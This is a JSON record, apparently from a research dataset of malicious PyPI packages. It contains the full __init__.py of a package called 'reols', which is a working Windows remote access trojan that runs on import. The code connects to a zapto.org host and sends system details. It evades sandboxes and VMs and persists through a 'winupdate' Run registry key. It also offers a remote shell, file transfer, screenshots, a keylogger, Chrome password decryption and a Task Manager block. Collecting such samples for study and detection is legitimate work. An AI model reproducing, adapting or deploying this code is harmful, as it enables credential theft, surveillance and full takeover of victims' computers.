[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/reols-0.1/reols/__init__.py",
    "malicious_code": "import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze, threading, pynput.keyboard, wmi\nimport win32api, winerror, win32event, win32crypt\nfrom shutil import copyfile\nfrom winreg import *\n\n# strHost = \"\"\nstrHost = socket.gethostbyname(\"securedmaininfo5.zapto.org\")\nintPort = 3000\n\nstrPath = os.path.realpath(sys.argv[0])  # get file path\nTMP = os.environ[\"TEMP\"]  # get temp path\nAPPDATA = os.environ[\"APPDATA\"]\nintBuff = 1024\n\n# function to prevent multiple instances\nmutex = win32event.CreateMutex(None, 1, \"PA_mutex_xp4\")\nif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n    mutex = None\n    sys.exit(0)\n\ndef detectSandboxie():\n    try:\n        libHandle = ctypes.windll.LoadLibrary(\"SbieDll.dll\")\n        return \" (Sandboxie) \"\n    except: return \"\"\n\ndef detectVM():\n    objWMI = wmi.WMI()\n    for objDiskDrive in objWMI.query(\"Select * from Win32_DiskDrive\"):\n        if \"vbox\" in objDiskDrive.Caption.lower() or \"virtual\" in objDiskDrive.Caption.lower():\n            return \" (Virtual Machine) \"\n    return \"\"\n\ndef server_connect():\n    global objSocket\n    while True:  # infinite loop until socket can connect\n        try:\n            objSocket = socket.socket()\n            objSocket.connect((strHost, intPort))\n        except socket.error:\n            time.sleep(5)  # wait 5 seconds to try again\n        else: break\n\n    strUserInfo = socket.gethostname() + \"`,\" + platform.system() + \" \" + platform.release() + detectSandboxie() + detectVM() + \\\n                  \"`,\" + os.environ[\"USERNAME\"]\n    send(str.encode(strUserInfo))\n\n# function to return decoded utf-8\ndecode_utf8 = lambda data: data.decode(\"utf-8\")\n\n# function to receive and decrypt data\nrecv = lambda buffer: objSocket.recv(buffer)\n\n# function to send encrypted data\nsend = lambda data: objSocket.send(data)\n\nserver_connect()\n\ndef OnKeyboardEvent(event):\n    global strKeyLogs\n\n    try:  # check to see if variable is defined\n        strKeyLogs\n    except NameError:\n        strKeyLogs = \"\"\n\n    if event == Key.backspace:\n        strKeyLogs += \" [Bck] \"\n    elif event == Key.tab:\n        strKeyLogs += \" [Tab] \"\n    elif event == Key.enter:\n        strKeyLogs += \"\\n\"\n    elif event == Key.space:\n        strKeyLogs += \" \"\n    elif type(event) == Key:  # if the character is some other type of special key\n        strKeyLogs += \" [\" + str(event)[4:] + \"] \"\n    else:\n        strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character\n\n\nKeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)\nKey = pynput.keyboard.Key\n\ndef recvall(buffer):  # function to receive large amounts of data\n    bytData = b\"\"\n    while True:\n        bytPart = recv(buffer)\n        if len(bytPart) == buffer:\n            return bytPart\n        bytData += bytPart\n        if len(bytData) == buffer:\n            return bytData\n\n# vbs message box\ndef MessageBox(message):\n    objVBS = open(TMP + \"/m.vbs\", \"w\")\n    objVBS.write(\"Msgbox \\\"\" + message + \"\\\", vbOKOnly+vbInformation+vbSystemModal, \\\"Message\\\"\")\n    objVBS.close()\n    subprocess.Popen([\"cscript\", TMP + \"/m.vbs\"], shell=True)\n\ndef startup():\n    try:\n        strAppPath = APPDATA + \"\\\\\" + os.path.basename(strPath)\n        copyfile(strPath, strAppPath.replace('.py','.pyw'))\n        objRegKey = OpenKey(HKEY_CURRENT_USER, \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", 0, KEY_ALL_ACCESS)\n        SetValueEx(objRegKey, \"winupdate\", 0, REG_SZ, strAppPath.replace('.py','.pyw')); CloseKey(objRegKey)\n    except WindowsError:\n        send(str.encode(\"Unable to add to startup!\"))\n    else:\n        send(str.encode(\"success\"))\n\ndef screenshot():\n    pyscreeze.screenshot(TMP + \"/s.png\")\n\n    # send screenshot information to server\n    send(str.encode(\"Receiving Screenshot\" + \"\\n\" + \"File size: \" + str(os.path.getsize(TMP + \"/s.png\"))\n                              + \" bytes\" + \"\\n\" + \"Please wait...\"))\n    objPic = open(TMP + \"/s.png\", \"rb\")  # send file contents and close the file\n    time.sleep(1)\n    send(objPic.read())\n    objPic.close()\n\ndef file_browser():\n    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives\n    arrRawDrives = arrRawDrives.split('\\000')[:-1]\n\n    strDrives = \"\"\n    for drive in arrRawDrives:  # get proper view and place array into string\n        strDrives += drive.replace(\"\\\\\", \"\") + \"\\n\"\n    send(str.encode(strDrives))\n\n    strDir = decode_utf8(recv(intBuff))\n\n    if os.path.isdir(strDir):\n        arrFiles = os.listdir(strDir)\n\n        strFiles = \"\"\n        for file in arrFiles:\n            strFiles += (file + \"\\n\")\n\n        send(str.encode(str(len(strFiles))))  # send buffer size\n        time.sleep(0.1)\n        send(str.encode(strFiles))\n\n    else:  # if the user entered an invalid directory\n        send(str.encode(\"Invalid Directory!\"))\n        return\n\ndef upload(data):\n    intBuffer = int(data)\n    file_data = recvall(intBuffer)\n    strOutputFile = decode_utf8(recv(intBuff))\n\n    try:\n        objFile = open(strOutputFile, \"wb\")\n        objFile.write(file_data)\n        objFile.close()\n        send(str.encode(\"Done!!!\"))\n    except:\n        send(str.encode(\"Path is protected/invalid!\"))\n\ndef receive(data):\n    if not os.path.isfile(data):\n        send(str.encode(\"Target file not found!\"))\n        return\n\n    send(str.encode(\"File size: \" + str(os.path.getsize(data))\n                              + \" bytes\" + \"\\n\" + \"Please wait...\"))\n    objFile = open(data, \"rb\")  # send file contents and close the file\n    time.sleep(1)\n    send(objFile.read())\n    objFile.close()\n\ndef lock():\n    ctypes.windll.user32.LockWorkStation()  # lock pc\n\ndef shutdown(shutdowntype):\n    command = \"shutdown {0} -f -t 30\".format(shutdowntype)\n    subprocess.Popen(command.split(), shell=True)\n    objSocket.close()  # close connection and exit\n    sys.exit(0)\n\ndef command_shell():\n    strCurrentDir = str(os.getcwd())\n\n    send(str.encode(strCurrentDir))\n\n    while True:\n        strData = decode_utf8(recv(intBuff))\n\n        if strData == \"goback\":\n            os.chdir(strCurrentDir)  # change directory back to original\n            break\n\n        elif strData[:2].lower() == \"cd\" or strData[:5].lower() == \"chdir\":\n            objCommand = subprocess.Popen(strData + \" & cd\", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)\n            if (objCommand.stderr.read()).decode(\"utf-8\") == \"\":  # if there is no error\n                strOutput = (objCommand.stdout.read()).decode(\"utf-8\").splitlines()[0]  # decode and remove new line\n                os.chdir(strOutput)  # change directory\n\n                bytData = str.encode(\"\\n\" + str(os.getcwd()) + \">\")  # output to send the server\n\n        elif len(strData) > 0:\n            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)\n            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode(\"utf-8\", errors=\"replace\")  # since cmd uses bytes, decode it\n\n            bytData = str.encode(strOutput + \"\\n\" + str(os.getcwd()) + \">\")\n        else:\n            bytData = str.encode(\"Error!!!\")\n\n        strBuffer = str(len(bytData))\n        send(str.encode(strBuffer))  # send buffer size\n        time.sleep(0.1)\n        send(bytData)  # send output\n\ndef vbs_block_process(process, popup, message, title, timeout, type):\n    # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source\n\n    strVBSCode = \"On Error Resume Next\" + \"\\n\" + \\\n                 \"Set objWshShl = WScript.CreateObject(\\\"WScript.Shell\\\")\" + \"\\n\" + \\\n                 \"Set objWMIService = GetObject(\\\"winmgmts:\\\" & \\\"{impersonationLevel=impersonate}!//./root/cimv2\\\")\" + \"\\n\" + \\\n                 \"Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\\\"select * \" \\\n                 \"from __instancecreationevent \\\" & \\\" within 1 where TargetInstance isa 'Win32_Process'\\\")\" + \"\\n\" + \\\n                 \"Do\" + \"\\n\" + \"Set objLatestProcess = colMonitoredProcesses.NextEvent\" + \"\\n\" + \\\n                 \"If LCase(objLatestProcess.TargetInstance.Name) = \\\"\" + process + \"\\\" Then\" + \"\\n\" + \\\n                 \"objLatestProcess.TargetInstance.Terminate\" + \"\\n\"\n    if popup == \"True\":  # if showing a message\n        strVBSCode += \"objWshShl.Popup \\\"\" + message + \"\\\",\" + timeout + \", \\\"\" + title + \"\\\",\" + type + \"\\n\"\n\n    strVBSCode += \"End If\" + \"\\n\" + \"Loop\"\n\n    objVBSFile = open(TMP + \"/d.vbs\", \"w\")  # write the code and close the file\n    objVBSFile.write(strVBSCode); objVBSFile.close()\n\n    subprocess.Popen([\"cscript\", TMP + \"/d.vbs\"], shell=True)  # run the script\n\ndef disable_taskmgr():\n    global blnDisabled\n    if blnDisabled == \"False\":  # if task manager is already disabled, enable it\n        send(str.encode(\"Enabling ...\"))\n\n        subprocess.Popen([\"taskkill\", \"/f\", \"/im\", \"cscript.exe\"], shell=True)\n\n        blnDisabled = \"True\"\n    else:\n        send(str.encode(\"Disabling ...\"))\n\n        vbs_block_process(\"taskmgr.exe\", \"True\", \"Task Manager has been disabled by your administrator\",\n                      \"Task Manager\", \"3\", \"16\")\n        blnDisabled = \"False\"\n\ndef chrpass():  # legal purposes only!\n    strPath = APPDATA + \"/../Local/Google/Chrome/User Data/Default/Login Data\"\n\n    if not os.path.isfile(APPDATA + \"/../Local/Google/Chrome/User Data/Default/Login Data\"):\n        send(str.encode(\"noexist\"))\n        return\n\n    conn = sqlite3.connect(strPath)  # connect to database\n    objCursor = conn.cursor()\n\n    try:\n        objCursor.execute(\"Select action_url, username_value, password_value FROM logins\")  # look for credentials\n    except:  # if the chrome is open\n        send(str.encode(\"error\"))\n        strServerResponse = decode_utf8(recv(intBuff))\n\n        if strServerResponse == \"close\":  # if the user wants to close the browser\n            subprocess.Popen([\"taskkill\", \"/f\", \"/im\", \"chrome.exe\"], shell=True)\n        return\n\n    strResults = \"Chrome Saved Passwords:\" + \"\\n\"\n\n    for result in objCursor.fetchall():  # get data as raw text from sql db\n        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]\n        if password:\n            strResults += \"Site: \" + result[0] + \"\\n\" + \"Username: \" + result[1] + \"\\n\" + \"Password: \" \\\n                          + decode_utf8(password)\n\n    strBuffer = str(len(strResults))\n    send(str.encode(strBuffer))  # send buffer\n    time.sleep(0.2)\n    send(str.encode(strResults))\n\ndef keylogger(option):\n    global strKeyLogs\n\n    if option == \"start\":\n        if not KeyListener.running:\n            KeyListener.start()\n            send(str.encode(\"success\"))\n        else:\n            send(str.encode(\"error\"))\n\n    elif option == \"stop\":\n        if KeyListener.running:\n            KeyListener.stop()\n            threading.Thread.__init__(KeyListener)  # re-initialise the thread\n            strKeyLogs = \"\"\n            send(str.encode(\"success\"))\n        else:\n            send(str.encode(\"error\"))\n\n    elif option == \"dump\":\n        if not KeyListener.running:\n            send(str.encode(\"error\"))\n        else:\n            if strKeyLogs == \"\":\n                send(str.encode(\"error2\"))\n            else:\n                time.sleep(0.2)\n                send(str.encode(str(len(strKeyLogs))))  # send buffer size\n                time.sleep(0.2)\n                send(str.encode(strKeyLogs))  # send logs\n\n                strKeyLogs = \"\"  # clear logs\n\ndef run_command(command):\n    strLogOutput = \"\\n\"\n\n    if len(command) > 0:\n        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)\n        strLogOutput += (objCommand.stdout.read() + objCommand.stderr.read()).decode(\"utf-8\", errors=\"ignore\")\n    else:\n        strLogOutput += \"Error!!!\"\n\n    bytData = str.encode(strLogOutput)\n\n    strBuffer = str(len(bytData))\n    send(str.encode(strBuffer))  # send buffer size\n    time.sleep(0.1)\n    send(bytData)  # send output\n\nwhile True:\n    try:\n        while True:\n            strData = recv(intBuff)\n            strData = decode_utf8(strData)\n\n            if strData == \"exit\":\n                objSocket.close()\n                sys.exit(0)\n            elif strData[:3] == \"msg\":\n                MessageBox(strData[3:])\n            elif strData[:4] == \"site\":\n                webbrowser.get().open(strData[4:])\n            elif strData == \"startup\":\n                startup()\n            elif strData == \"screen\":\n                screenshot()\n            elif strData == \"filebrowser\":\n                file_browser()\n            elif strData[:4] == \"send\":\n                upload(strData[4:])\n            elif strData[:4] == \"recv\":\n                receive(strData[4:])\n            elif strData == \"lock\":\n                lock()\n            elif strData == \"shutdown\":\n                shutdown(\"-s\")\n            elif strData == \"restart\":\n                shutdown(\"-r\")\n            elif strData == \"test\":\n                continue\n            elif strData == \"cmd\":\n                command_shell()\n            elif strData == \"chrpass\":\n                chrpass()\n            elif strData == \"keystart\":\n                keylogger(\"start\")\n            elif strData == \"keystop\":\n                keylogger(\"stop\")\n            elif strData == \"keydump\":\n                keylogger(\"dump\")\n            elif strData[:6] == \"runcmd\":\n                run_command(strData[6:])\n            elif strData == \"dtaskmgr\":\n                if not \"blnDisabled\" in globals():  # if the variable doesnt exist yet\n                    blnDisabled = \"True\"\n                disable_taskmgr()\n    except socket.error:  # if the server closes without warning\n        objSocket.close()\n        del objSocket\n        server_connect()\n"
  }
]